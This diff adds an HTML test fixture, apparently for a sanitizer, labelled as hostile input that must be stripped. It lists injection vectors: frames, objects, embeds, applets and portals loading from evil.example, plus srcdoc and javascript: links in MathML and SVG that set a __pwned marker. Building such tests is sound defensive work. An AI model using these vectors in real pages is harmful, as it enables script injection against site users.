@@ -1,0 +1,12 @@
+<html><body>
+<p>Hostile fixture 07: frames, objects, embeds. None may appear.</p>
+<iframe src="https://evil.example/frame"></iframe>
+<iframe srcdoc="&lt;script&gt;parent.parent.__pwned='srcdoc'&lt;/script&gt;"></iframe>
+<object data="https://evil.example/x.swf" type="application/x-shockwave-flash"></object>
+<embed src="https://evil.example/x.pdf">
+<applet code="Evil.class" codebase="https://evil.example/"></applet>
+<frameset><frame src="https://evil.example/frame2"></frameset>
+<portal src="https://evil.example/portal"></portal>
+<math><mtext><a href="javascript:parent.__pwned='math'">math link</a></mtext></math>
+<svg><a xlink:href="javascript:parent.__pwned='svg-link'"><text y="10">svg link</text></a><image href="https://evil.example/svg-image.png"/><use href="https://evil.example/sprite.svg#x"/></svg>
+</body></html>
